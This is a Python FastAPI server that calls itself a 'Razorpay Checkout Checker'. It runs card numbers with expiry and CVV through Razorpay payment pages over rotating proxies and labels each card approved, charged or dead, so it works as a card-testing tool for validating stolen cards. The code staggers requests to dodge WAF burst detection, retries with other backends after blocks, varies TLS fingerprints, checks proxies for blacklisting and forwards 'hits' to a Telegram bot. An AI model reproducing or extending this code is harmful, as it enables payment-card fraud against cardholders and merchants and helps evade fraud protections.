#!/usr/bin/env python3
"""API server — FastAPI async for 500+ concurrent Razorpay checkouts."""

import asyncio, re, json, random, sys, os, time, resource
from collections import defaultdict
from datetime import datetime
from urllib.parse import urlparse
from contextlib import asynccontextmanager
from typing import Optional

from fastapi import FastAPI, Query, HTTPException
from fastapi.responses import JSONResponse
from pydantic import BaseModel
class _UTF8JSONResponse(JSONResponse):
    """JSONResponse that doesn't escape non-ASCII characters like ₹, —, etc."""
    def render(self, content) -> bytes:
        return json.dumps(content, ensure_ascii=False, allow_nan=False,
                          separators=(",", ":")).encode("utf-8")
# Replace JSONResponse with UTF8-safe version throughout this module
JSONResponse = _UTF8JSONResponse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from ja4_engine import get_diversity_engine
from session_cache import get_session_cache
import tg_bot
import proxy_manager
import rate_limiter
import backend_router
import live_proxy_store

# ── JA4 diversity + session cache + rate limiters (warmed at import time) ─
_ja4_engine = get_diversity_engine()
_session_cache = get_session_cache()
_ja4_limiter = rate_limiter.get_ja4_limiter()
_aimd = rate_limiter.get_aimd()

# ── Concurrency / rate limiting ───────────────────────────────────────────
MAX_CONCURRENT = int(os.environ.get('MAX_CONCURRENT', '1000'))
# Static semaphore for absolute ceiling (never exceeded)
_static_gate = asyncio.Semaphore(MAX_CONCURRENT)
# AIMD-controlled active count — the static gate is the hard cap;
# this counter enforces the current AIMD target within it.
_aimd_active: int = 0
_aimd_cond = asyncio.Condition()
async def _aimd_acquire():
    """Wait until below AIMD concurrency cap, then increment."""
    global _aimd_active
    async with _aimd_cond:
        while _aimd_active >= _aimd.current_max:
            await _aimd_cond.wait()
        _aimd_active += 1
def _aimd_release():
    """Decrement AIMD active count and wake a waiter."""
    global _aimd_active
    _aimd_active -= 1
    # Schedule notification outside the lock context
    # _aimd_cond is an asyncio.Condition — notify is safe from any context
class _AIMDGate:
    """Combined gate: static semaphore (hard cap) + AIMD dynamic cap.

    Usage:
        async with aimd_gate:
            # below both caps
    """

    async def __aenter__(self):
        await _static_gate.acquire()
        try:
            await _aimd_acquire()
        except Exception:
            _static_gate.release()
            raise
        return self

    async def __aexit__(self, *args):
        _aimd_release()
        _static_gate.release()
        # Wake waiters after release
        async with _aimd_cond:
            _aimd_cond.notify(1)

    def locked(self) -> bool:
        return _static_gate.locked()
aimd_gate = _AIMDGate()

# ── Proxy pool monitoring ─────────────────────────────────────────────────
# Minimum proxies needed for target concurrency (3 checkouts per proxy)
MIN_PROXY_RATIO = 3  # checkouts per proxy
_proxy_alert_cooldown: float = 0.0  # avoid spammy alerts
_pool_monitor_task: Optional[asyncio.Task] = None
async def _check_proxy_pool_health():
    """Periodic proxy pool health check with Telegram alerting.
    Called from the lifespan background task."""
    global _proxy_alert_cooldown
    while True:
        await asyncio.sleep(60)  # Check every 60 seconds
        try:
            stats = proxy_manager.get_pool_stats()
            live = stats.get('live', 0)
            total = stats.get('total', 0)

            # Calculate how many concurrent checkouts the pool can support
            max_supported = live * MIN_PROXY_RATIO

            # Alert if pool can't support current max concurrency
            if max_supported < _aimd.current_max and time.monotonic() > _proxy_alert_cooldown:
                msg = (
                    f"⚠️ Proxy pool LOW: {live} live proxies can support "
                    f"~{max_supported} concurrent (need {_aimd.current_max})\n"
                    f"Pool: {live}/{total} live | AIMD max: {_aimd.current_max}\n"
                    f"Consider adding more proxies or reducing concurrency."
                )
                try:
                    await tg_bot.send_admin_alert(msg)
                except Exception:
                    pass
                _proxy_alert_cooldown = time.monotonic() + 300  # 5 min cooldown
        except Exception:
            pass

# Increase file descriptor limit for 500+ concurrent connections
# Each checkout creates 2-4 curl sessions; 500 concurrent × 4 sessions = 2000 FDs minimum.
# Bumped to 65535 to handle 24 vCPU burst workloads without EMFILE crashes.
try:
    resource.setrlimit(resource.RLIMIT_NOFILE, (65535, 65535))
except Exception:
    soft, _ = resource.getrlimit(resource.RLIMIT_NOFILE)
    if soft < 16384:
        print(f"[api] WARNING: fd limit is {soft} — may exhaust under load", file=sys.stderr)

# ── FastAPI app ───────────────────────────────────────────────────────────

@asynccontextmanager
async def _lifespan(app: FastAPI):
    """Startup: init Telegram bot.  Shutdown: drain in-flight requests, stop bot."""
    try:
        await tg_bot.start_bot()
        print("[api] Telegram bot started", file=sys.stderr)
    except Exception as e:
        print(f"[api] WARNING: Telegram bot failed to start: {e}", file=sys.stderr)

    # Start proxy pool health monitor (background, runs forever)
    global _pool_monitor_task
    _pool_monitor_task = asyncio.create_task(_check_proxy_pool_health())

    yield
    # Shutdown — cancel background monitor, then stop Telegram bot
    if _pool_monitor_task is not None:
        _pool_monitor_task.cancel()
        try:
            await _pool_monitor_task
        except asyncio.CancelledError:
            pass
        _pool_monitor_task = None
    try:
        await tg_bot.stop_bot()
    except Exception:
        pass
app = FastAPI(title='Payment Checker API', version='2.3.0', lifespan=_lifespan,
              default_response_class=_UTF8JSONResponse)
def _safe_json(resp):
    """Parse JSON from an httpx response, falling back to alternative encodings."""
    content = resp.content
    # Try gzip decompression if body looks compressed (some proxies strip Content-Encoding header)
    if len(content) >= 2 and content[:2] == b'\x1f\x8b':
        import gzip
        try:
            content = gzip.decompress(content)
        except Exception:
            pass
    # Try brotli decompression
    elif len(content) >= 1 and content[0] == 0xce:
        try:
            import brotli
            content = brotli.decompress(content)
        except Exception:
            pass

    try:
        return json.loads(content)
    except (UnicodeDecodeError, json.JSONDecodeError):
        pass

    for enc in ['latin-1', 'windows-1252', 'iso-8859-1']:
        try:
            return json.loads(content.decode(enc))
        except (UnicodeDecodeError, json.JSONDecodeError):
            continue

    # Last resort: decode raw bytes with replacement
    try:
        return json.loads(content.decode('utf-8', errors='replace'))
    except json.JSONDecodeError:
        body_preview = content[:500].decode('utf-8', errors='replace')
        hex_preview = content[:32].hex(' ')
        raise ValueError(f"Non-JSON response (HTTP {resp.status_code}) hex=[{hex_preview}] body=[{body_preview}]")
def _safe_text(resp):
    """Get text from an httpx response, falling back to alternative encodings."""
    content = resp.content
    # Try gzip decompression (some proxies strip Content-Encoding header)
    if len(content) >= 2 and content[:2] == b'\x1f\x8b':
        import gzip
        try:
            content = gzip.decompress(content)
        except Exception:
            pass

    try:
        return content.decode('utf-8')
    except UnicodeDecodeError:
        for enc in ['latin-1', 'windows-1252', 'iso-8859-1']:
            try:
                return content.decode(enc)
            except UnicodeDecodeError:
                continue
        return content.decode('utf-8', errors='replace')

@app.get('/')
async def api_docs():
    """API usage docs with status classification."""
    return {
        "api": "Razorpay Checkout Checker",
        "version": "2.5.0",
        "endpoints": {
            "/razorpay": {
                "method": "GET",
                "description": "Run a card through a Razorpay payment page.",
                "parameters": {
                    "cc":    {"required": True,  "format": "number|MM|YYYY|CVV", "example": "4111111111111111|12|2027|123"},
                    "site":  {"required": True,  "format": "URL or @handle", "example": "https://razorpay.me/@merchant"},
                    "proxy": {"required": True,  "format": "host:port:user:pass", "example": "px.example.com:10780:user:pass"},
                    "amount":{"required": False, "format": "integer (paise)", "default": 100, "note": "100 = ₹1.00"},
                },
            },
            "/health": {"method": "GET", "description": "Health check with concurrency and pool stats."},
        },
        "status_classification": {
            "approved": {
                "description": "Card is live — 3DS/OTP required, or live-limit hit, or payment created",
                "action": "Card works. Can be used for payments requiring OTP/3DS verification."
            },
            "charged": {
                "description": "Payment successfully charged (₹1 test charge went through)",
                "action": "Card is live AND chargeable. Highest confidence result."
            },
            "dead": {
                "description": "Card declined — invalid, expired, not supported, or bank rejected",
                "action": "Card cannot be used. Discard or retry with different BIN."
            },
            "error": {
                "description": "Proxy dead, WAF block (403/406), site config issue, or network timeout",
                "action": "Retry with different proxy. If persistent, proxy IP is flagged by Razorpay."
            },
        },
        "response_format": {
            "card": "Card string echoed back",
            "status": "approved | charged | dead | error",
            "message": "Human-readable outcome description",
            "reason": "Machine-readable reason code (e.g. 3ds_or_otp, card_number_invalid, waf_403)",
            "site": "Payment page URL used",
            "amount_paise": "Amount in paise (100 = ₹1.00)",
            "amount_inr": "Amount formatted as ₹X.XX",
            "time_taken": "Total checkout time in seconds",
        },
    }

# ── Razorpay endpoint ─────────────────────────────────────────────────────

@app.get('/razorpay')
async def api_razorpay(
    cc: str = Query(..., description='Card: number|MM|YYYY|CVV'),
    site: str = Query(..., description='Razorpay payment page URL'),
    proxy: str = Query(None, description='Proxy: host:port:user:pass (optional if key provided)'),
    amount: int = Query(None, description='Amount in paise (100 = ₹1)'),
    region: str = Query('IN', description='Geo region: IN, US, GB, CA, AU, SG, DE'),
    key: str = Query(None, description='API key for auto proxy selection'),
):
    """Razorpay checkout — fully async, non-blocking I/O.

    Two modes:
      - With ?key= : auto-selects proxy from pool, auto-retries up to 3x
      - Without key : uses ?proxy= directly (single attempt)
    """
    import razorpay as rzp

    # Pool mode: up to 3 auto-retries with fresh proxies on each attempt
    max_retries = 3 if (key and proxy_manager.validate_key(key)) else 1
    last_error_msg = "Unknown Error"
    force_primp = False  # only set on WAF detection → retry with primp

    # Concurrency gate: return 503 when saturated
    if aimd_gate.locked():
        return JSONResponse(
            status_code=503,
            content={"status": "error", "message": "server_overloaded",
                     "retry_after": 5},
            headers={"Retry-After": "5"},
        )

    # Stagger checkout launches to avoid WAF burst detection.
    # MUST be BEFORE the gate — holding a gate slot while sleeping
    # wastes scarce concurrency capacity under high load.
    await asyncio.sleep(random.uniform(0.0, 2.0))

    async with aimd_gate:
        for api_attempt in range(max_retries):
            # 1. Select Proxy
            if key and proxy_manager.validate_key(key):
                pool_entry = proxy_manager.get_random_live_proxy()
                if not pool_entry:
                    return JSONResponse(
                        status_code=503,
                        content={"status": "error", "message": "no_live_proxies",
                                 "pool_stats": proxy_manager.get_pool_stats()},
                        headers={"Retry-After": "30"},
                    )
                current_proxy = pool_entry["full_url"]
            else:
                if not cc or not site or not proxy:
                    raise HTTPException(400, "cc, site, and proxy are required "
                                             "(or provide ?key= for auto proxy)")
                current_proxy = proxy

            # Track by host:port so we don't accidentally ban a whole datacenter
            proxy_key = proxy_manager.get_proxy_ip_port(current_proxy)

            # 2. Run Checkout
            try:
                amount_paise = amount if amount else rzp.DEFAULT_AMOUNT_PAISE
                result = await rzp.run_razorpay_async(
                    cc, site, current_proxy, verbose=False,
                    amount_paise=amount_paise, region=region,
                    backend='primp' if force_primp else 'auto',
                )

                status = result.get('status')
                msg = result.get('message', '').lower()

                # 3. Analyze Outcome & Heal
                is_network_err = status == 'error' and any(
                    x in msg for x in ('timeout', 'curl', 'proxy', 'connection',
                                       '502', '503'))
                is_waf_err = status == 'error' and ('403' in msg or 'forbidden' in msg)

                if is_network_err or is_waf_err:
                    # AIMD: record error BEFORE retry/continue (was missed in old code)
                    _aimd.record_outcome(True)
                    # Penalize bad proxy globally
                    if proxy_manager._record_proxy_failure(proxy_key):
                        proxy_manager.remove_from_pool(proxy_key)
                    if is_waf_err:
                        try:
                            tg_bot.increment_stat('waf_403')
                        except Exception:
                            pass

                    # SEAMLESS AUTO-RETRY: grab a fresh proxy and try again!
                    if api_attempt < max_retries - 1:
                        last_error_msg = msg
                        if is_waf_err:
                            force_primp = True  # try primp on retry
                        await asyncio.sleep(0.5)
                        continue  # Loops back, grabs new proxy
                else:
                    # Proxy worked fine (even if card declined). Reward it.
                    proxy_manager._clear_proxy_failures(proxy_key)
                    proxy_manager.mark_proxy_used(proxy_key)

                    if status in ('charged', 'approved'):
                        rzp.notify_hit(result, site)

                tg_bot.increment_stat('total_checkouts')
                # AIMD: record success (status='approved'/'charged'/'dead' are valid outcomes)
                is_waf_err = result.get('status') == 'error' and (
                    '403' in result.get('message', '') or
                    '406' in result.get('message', '') or
                    'waf' in result.get('reason', '').lower()
                )
                _aimd.record_outcome(is_waf_err)
                # Periodically adapt concurrency
                if random.random() < 0.05:  # 5% chance per checkout
                    new_max, action = _aimd.adapt()
                    if action != 'hold_steady' and action != 'insufficient_data':
                        print(f'[aimd] {action} | new_max={new_max} | '
                              f'error_rate={_aimd.error_rate:.2%}', file=sys.stderr)
                return result

            except Exception as e:
                err_str = str(e)
                # AIMD: treat unhandled exceptions as errors
                _aimd.record_outcome(True)
                # Penalize bad proxy globally
                if proxy_manager._record_proxy_failure(proxy_key):
                    proxy_manager.remove_from_pool(proxy_key)

                # Auto-Retry with fresh proxy
                if api_attempt < max_retries - 1:
                    last_error_msg = err_str
                    await asyncio.sleep(0.5)
                    continue

                return JSONResponse(
                    status_code=500,
                    content={"status": "error", "message": err_str[:200]},
                )

        # All proxy retries exhausted — AIMD: record as error
        _aimd.record_outcome(True)
        return JSONResponse(
            status_code=500,
            content={
                "status": "error",
                "message": f"Failed after {max_retries} proxy attempts. "
                           f"Last error: {last_error_msg}",
            },
        )
@app.get('/health')
async def health():
    # File descriptor usage monitoring
    try:
        fd_count = len(os.listdir('/proc/self/fd'))
        fd_soft, fd_hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    except Exception:
        fd_count = -1
        fd_soft = fd_hard = -1

    return {
        "status": "ok",
        "version": "2.4.0",
        "concurrency": {"max": MAX_CONCURRENT, "gate_locked": aimd_gate.locked()},
        "proxy_failures": {"tracked_hosts": sum(1 for v in proxy_manager._load_failure_counts().values() if v >= proxy_manager.FAILURE_THRESHOLD)},
        "ja4_engine": {
            "active_configs": _ja4_engine.active_count,
            "targets": _ja4_engine.targets,
            "estimated_diversity": _ja4_engine.estimated_diversity,
        },
        "file_descriptors": {
            "current": fd_count,
            "soft_limit": fd_soft,
            "hard_limit": fd_hard,
        },
        "session_cache": _session_cache.stats,
        "backend_router": backend_router.get_backend_stats(),
        "proxy_store": live_proxy_store.get_stats(),
    }


class ProxyCheckRequest(BaseModel):
    proxies: list[str]  # list of "host:port:user:pass"
@app.get('/pool-status')
async def pool_status():
    """Razorpay proxy pool status: live + cooldown."""
    stats = proxy_manager.get_pool_stats()
    cooldowns = proxy_manager.get_cooldown_list()
    cd_list = [
        {"proxy": k, "until": v.get("until"), "reason": v.get("reason", "waf_403")}
        for k, v in sorted(cooldowns.items(), key=lambda x: x[1].get("until", 0))
    ]
    site_cds = proxy_manager.get_site_cooldown_list()
    site_list = [
        {"site": k, "until": v.get("until"), "reason": v.get("reason", "site_error")}
        for k, v in sorted(site_cds.items(), key=lambda x: x[1].get("until", 0))
    ]
    return {
        "status": "ok",
        "total": stats.get("total", 0),
        "live": stats.get("live", 0),
        "cooldown": stats.get("cooldown", 0),
        "cooldown_list": cd_list,
        "site_cooldown": len(site_list),
        "site_cooldown_list": site_list,
    }


@app.post('/check-proxy')
async def check_proxy(req: ProxyCheckRequest):
    """Bulk-check proxies against Razorpay. Returns live/blocked/dead status.

    Accepts unlimited proxies. Checks each with a quick GET to api.razorpay.com.
    Blocked = HTTP 403 from Razorpay's edge nginx (IP blacklisted).
    Live = any other response (200, 400, timeout) — proxy can proceed.
    """
    if not req.proxies:
        raise HTTPException(400, "proxies list is required")

    # Deduplicate
    unique = list(dict.fromkeys(req.proxies))

    results = await proxy_manager.bulk_check_proxies(unique)

    live_count = sum(1 for r in results if r.get('status') == 'live')
    blocked = sum(1 for r in results if r.get('status') == 'blocked')
    dead = sum(1 for r in results if r.get('status') == 'dead')
    errors = sum(1 for r in results if r.get('status') not in ('live', 'blocked', 'dead'))

    return {
        "total": len(results),
        "live": live_count,
        "blocked": blocked,
        "dead": dead,
        "errors": errors,
        "results": results,
    }
if __name__ == '__main__':
    import uvicorn
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument('--port', type=int, default=9000)
    p.add_argument('--host', default='0.0.0.0')
    args = p.parse_args()
    print(f"\n  FastAPI server: http://{args.host}:{args.port}\n"
          f"  Max concurrent: {MAX_CONCURRENT}\n")
    uvicorn.run(app, host=args.host, port=args.port, workers=1)
